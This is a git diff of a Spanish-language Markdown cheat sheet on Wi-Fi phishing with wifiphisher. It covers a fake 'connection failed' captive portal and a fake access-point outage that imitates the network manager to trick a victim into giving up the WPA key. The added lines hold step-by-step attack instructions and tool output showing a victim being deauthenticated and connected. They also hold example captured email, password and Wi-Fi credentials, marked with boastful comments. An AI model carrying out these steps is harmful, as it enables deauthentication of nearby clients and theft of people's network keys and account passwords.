@@ -2813,6 +2813,7 @@ apt install -y wifiphisher
 
 - **Este ataque necesita 2 adaptadores como mínimo**
 
+---
 
 ### Ataque con "Error de conexión falsa": (No necesita Internet)
 
@@ -2851,13 +2852,16 @@ wifiphisher
     #  [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                          [*] GET request from 10.0.0.57 for http://www.msftconnecttest.com/connecttest.txt                                            
     #  [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                          [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html             
     
-# 5. Salir de esa pantalla dando ESCAPE, se mostrará lo capturado que fue escrito por la víctima
+# 5. Salir de esa pantalla dando ESCAPE, se mostrará lo capturado que fue escrito por la víctima, por ejemplo:
 
-                                                                                     
+    ## [+] Captured credentials:
+    ## wfphshr-email=User_Fz3r0@mail.net&wfphshr-password=Sup3r_H4rd_p4ssw0rd_no_break_or????? <<<------||| Booooom!!!! ;) 
+    ## [!] Closing                                                                                  
 ````
 
+---
 
-### Ataque tipo MiTM Evil Twin: (Routeando Internet al Cliente)
+### Ataque de falsa caída de AP: (Necesita Internet)
 
 - Revisar que SI haya Internet en el atacante usando `systemctl start NetworkManager.service`.
 
@@ -2869,20 +2873,39 @@ wifiphisher
 
 # 3. Seleccionar un escenario de Phishing:
 
-    # Aquí se puede elegir el que se prefiera, en este caso usaré el phishing de credenciales de Social Networks (2)
-        ## 2 - OAuth Login Page                                                                                                       
-        ## A free Wi-Fi Service asking for Facebook credentials to authenticate using OAuth
+    # Aquí se puede elegir el que se prefiera, en este caso usaré el phishing de credenciales de Network Manager Connect (4)
+    
+    # 4 - Network Manager Connect                                                                                                
+    #     The idea is to imitate the behavior of the network manager by first showing the                                    
+    #     browser's "Connection Failed" page and then displaying the victim's network manager window through the page                
+    #     asking for the pre-shared key.
         
 # 4. Una vez seleccionado, automáticamente empezará el ataque:
 
-# 5. Regresar el internet que fue deshabilitado de los adaptadores
-systemctl start NetworkManager.service
-                                                                                      
+    # Extensions feed:                                                                             | Wifiphisher 1.4GIT          DEAUTH/DISAS - c8:94:02:b9:10:33                                                               #   | ESSID: Fz3r0_Air_PWN        
+    # DEAUTH/DISAS - 56:6b:26:ed:c0:f3                                                             | Channel: 6                  Victim c8:94:2:b9:10:33 probed for WLAN with ESSID: '' (KARMA)                               | AP interface: wlan1         
+    #                                                                                              | Options: [Esc] Quit                                                                                                      |_____________________________
+    # Connected Victims:                                                                                                         c8:94:02:b9:10:33       10.0.0.26       Unknown Windows                                                                    
+                      
+    # HTTP requests:                                                                                                             
+    # [*] GET request from 10.0.0.26 for http://pico.eset.com/pico/1/169155.pic                                                  
+    # [*] GET request from 10.0.0.26 for http://www.msftconnecttest.com/connecttest.txt                                          [*] GET request from 10.0.0.26 for http://www.msftconnecttest.com/connecttest.txt                                          
+    # [*] GET request from 10.0.0.26 for http://www.msftconnecttest.com/connecttest.txt                                          [*] GET request from 10.0.0.26 for http://ipv6.msftconnecttest.com/connecttest.txt 
 
+# 5. Salir de esa pantalla dando ESCAPE, se mostrará lo capturado que fue escrito por la víctima, por ejemplo:
+
+    ## [+] Captured credentials:
+    ## wfphshr-wpa-password=passwoerd_mine_su3r_h4rd
+    ## [!] Closing                                                                                      
 ````
 
+---
 
-systemctl start NetworkManager.service
+### Ataque de acceso con `Instagram`
+
+
+
+
 
 
 
